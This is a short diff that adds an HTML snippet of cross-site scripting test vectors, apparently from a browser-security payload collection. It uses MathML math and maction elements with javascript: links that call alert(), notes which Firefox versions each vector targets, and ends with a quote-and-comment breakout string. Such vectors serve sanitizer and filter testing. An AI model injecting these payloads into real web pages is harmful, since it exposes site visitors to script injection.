@@ -1,0 +1,8 @@
+<div id="130"><math href="javascript:alert(130)">CLICKME</math>
+<math>
+<!-- up to FF 13 -->
+<maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(2)">CLICKME</maction>
+
+<!-- FF 14+ -->
+<maction actiontype="statusline" xlink:href="javascript:alert(3)">CLICKME<mtext>http://http://google.com</mtext></maction>
+</math>//["'`-->]]>]</div>
